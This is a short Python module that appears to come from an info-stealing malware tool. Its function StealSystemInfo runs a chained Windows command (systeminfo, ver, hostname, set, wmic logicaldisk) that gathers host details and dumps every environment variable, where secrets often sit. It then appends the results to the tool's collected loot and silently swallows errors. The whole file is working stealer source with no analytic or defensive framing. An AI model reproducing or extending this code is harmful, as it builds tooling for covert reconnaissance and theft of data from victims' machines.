from main import ListFonction, error_handler
from computer import get_commands

async def StealSystemInfo() -> None:
    try:
        command = r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername'
        output = await get_commands(command)
        ListFonction.SystemInfo.append(output)
    except Exception as e:
        error_handler(f"system infos error - {str(e)}")
        pass